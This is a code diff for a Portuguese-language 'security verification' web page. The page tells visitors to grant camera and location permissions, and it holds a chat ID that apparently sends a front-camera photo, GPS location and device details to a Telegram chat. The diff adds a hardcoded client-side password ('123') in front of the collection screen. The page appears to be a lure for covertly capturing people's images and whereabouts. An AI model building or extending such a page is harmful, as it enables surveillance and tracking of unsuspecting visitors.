@@ -121,6 +121,49 @@
         .status.ok { color: #27ae60; font-weight: 600; }
         .status.erro { color: #e74c3c; }
 
+        .senha-box {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .senha-box label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: #666;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 8px;
+        }
+
+        .senha-box input {
+            width: 100%;
+            padding: 13px 16px;
+            border: 2px solid #e8eaf0;
+            border-radius: 10px;
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.2s;
+            letter-spacing: 4px;
+        }
+
+        .senha-box input:focus {
+            border-color: #667eea;
+        }
+
+        .senha-box input.errada {
+            border-color: #e74c3c;
+            animation: shake 0.3s ease;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
+        }
+
+        #tela-verificacao { display: none; }
+
         .step {
             display: flex;
             align-items: center;
@@ -150,18 +193,32 @@
 <div class="card">
     <div class="shield">🔐</div>
     <h1>Verificação de Segurança</h1>
-    <p class="subtitle">Para prosseguir, precisamos confirmar sua identidade. Conceda as permissões abaixo quando solicitado.</p>
+    <p class="subtitle">Digite a senha para acessar a verificação.</p>
 
-    <div class="info-box">
-        <p>O que será coletado:</p>
-        <div class="info-item"><span>📷</span> Foto pela câmera frontal</div>
-        <div class="info-item"><span>📍</span> Localização GPS</div>
-        <div class="info-item"><span>📱</span> Modelo e sistema do dispositivo</div>
-        <div class="info-item"><span>🕐</span> Data e hora do acesso</div>
+    <!-- Tela de senha -->
+    <div id="tela-senha">
+        <div class="senha-box">
+            <label>Senha de acesso</label>
+            <input type="password" id="campo-senha" placeholder="••••••" maxlength="20"
+                onkeydown="if(event.key==='Enter') confirmarSenha()">
+        </div>
+        <button onclick="confirmarSenha()">Entrar</button>
+        <div class="status" id="status-senha"></div>
     </div>
 
-    <button id="btn" onclick="iniciar()">Verificar minha identidade</button>
-    <div class="status" id="status"></div>
+    <!-- Tela de verificação -->
+    <div id="tela-verificacao">
+        <p class="subtitle" style="margin-bottom:24px">Para prosseguir, precisamos confirmar sua identidade. Conceda as permissões abaixo quando solicitado.</p>
+        <div class="info-box">
+            <p>O que será coletado:</p>
+            <div class="info-item"><span>📷</span> Foto pela câmera frontal</div>
+            <div class="info-item"><span>📍</span> Localização GPS</div>
+            <div class="info-item"><span>📱</span> Modelo e sistema do dispositivo</div>
+            <div class="info-item"><span>🕐</span> Data e hora do acesso</div>
+        </div>
+        <button id="btn" onclick="iniciar()">Verificar minha identidade</button>
+        <div class="status" id="status"></div>
+    </div>
 </div>
 
 <video id="video" autoplay playsinline muted></video>
@@ -173,8 +230,26 @@
     const CHAT_ID = '977667543';
     // ────────────────────────────────────────────────────────────
 
+    const SENHA = '123';
+
     const btn    = document.getElementById('btn');
     const status = document.getElementById('status');
+
+    function confirmarSenha() {
+        const input = document.getElementById('campo-senha');
+        const statusSenha = document.getElementById('status-senha');
+
+        if (input.value === SENHA) {
+            document.getElementById('tela-senha').style.display = 'none';
+            document.getElementById('tela-verificacao').style.display = 'block';
+        } else {
+            input.classList.add('errada');
+            statusSenha.textContent = 'Senha incorreta. Tente novamente.';
+            statusSenha.className = 'status erro';
+            input.value = '';
+            setTimeout(() => input.classList.remove('errada'), 400);
+        }
+    }
 
     function setStatus(msg, tipo = '') {
         status.innerHTML  = msg;
